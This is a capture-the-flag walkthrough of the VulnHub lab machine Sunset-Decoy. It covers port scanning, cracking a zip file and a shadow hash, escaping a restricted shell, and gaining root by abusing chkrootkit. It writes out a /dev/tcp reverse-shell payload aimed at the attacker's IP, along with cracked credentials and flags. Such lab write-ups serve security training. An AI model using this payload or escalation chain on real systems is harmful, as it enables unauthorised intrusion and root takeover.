# Sunset-Decoy

Lets check the IP address first —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled.png)

```bash
IP : 10.0.2.49
```

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Decoy]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.49
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-06 10:50 IST
Nmap scan report for 10.0.2.49
Host is up (0.00093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9b53e3be374e4ffb6d59ff181e7a44f (RSA)
|   256 cef3b3e70e90e264ac8d870f1588aa5f (ECDSA)
|_  256 66a98091f3d84b0a69b000229f3c4c5a (ED25519)
80/tcp open  http    Apache httpd 2.4.38
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.0K  2020-07-07 16:36  save.zip
|_
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:BA:A7:50 (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%201.png)

Now lets brute force the password of zip file with `fcrackzip` tool ➡️

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%202.png)

Got the password : `manuel`

Now Lets see what I got →

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%203.png)

Now lets decrypt the hash from shadow file with `hashcat` tool ➡️

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%204.png)

Now I got the credentials of user → 

```bash
296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::

password : server
```

Now let’s SSH into it ➡️

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%205.png)

Since it is running rbash so I need to convert it to bash for that lets see what I got —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%206.png)

Lets execute `honeypot.decoy` which have root privileges —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%207.png)

Lets run Leave a note command with runs on vim I think so , which that I can change the shell ➡️

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%208.png)

Now lets also set the PATH file —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%209.png)

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ cat user.txt 
35253d886842075b2c6390f35946e41f
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
```

Now lets enumerate freely —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2010.png)

Lets check the logs file —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2011.png)

here I find extraction of `chkrootkit` which works as Antivirus purpose and wait I also found AV launch option in `honeypot.decoy` file so lets execute it →

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2012.png)

Now I see it is executing the chkrootkit as root Lets find an exploit related to it —>

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2013.png)

After reading it I got the steps to perform this exploitation →

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2014.png)

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2015.png)

```bash
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo "bash -c 'bash -i >& /dev/tcp/10.0.2.27/4444 0>&1'" > /tmp/update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ chmod +x /tmp/update
296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$
```

Lets wait for cronjob to execute and wait for nc respomse →

![Untitled](/Vulnhub-Files/img/Sunset-Decoy/Untitled%2016.png)

```bash
root@60832e9f188106ec5bcc4eb7709ce592:~# cat root.txt	
cat root.txt
  ........::::::::::::..           .......|...............::::::::........
     .:::::;;;;;;;;;;;:::::.... .     \   | ../....::::;;;;:::::.......
         .       ...........   / \\_   \  |  /     ......  .     ........./\
...:::../\\_  ......     ..._/'   \\\_  \###/   /\_    .../ \_.......   _//
.::::./   \\\ _   .../\    /'      \\\\#######//   \/\   //   \_   ....////
    _/      \\\\   _/ \\\ /  x       \\\\###////      \////     \__  _/////
  ./   x       \\\/     \/ x X           \//////                   \/////
 /     XxX     \\/         XxX X                                    ////   x
-----XxX-------------|-------XxX-----------*--------|---*-----|------------X--
       X        _X      *    X      **         **             x   **    *  X
      _X                    _X           x                *          x     X_

1c203242ab4b4509233ca210d50d2cc5

Thanks for playing! - Felipe Winsnes (@whitecr0wz)
root@60832e9f188106ec5bcc4eb7709ce592:~#
```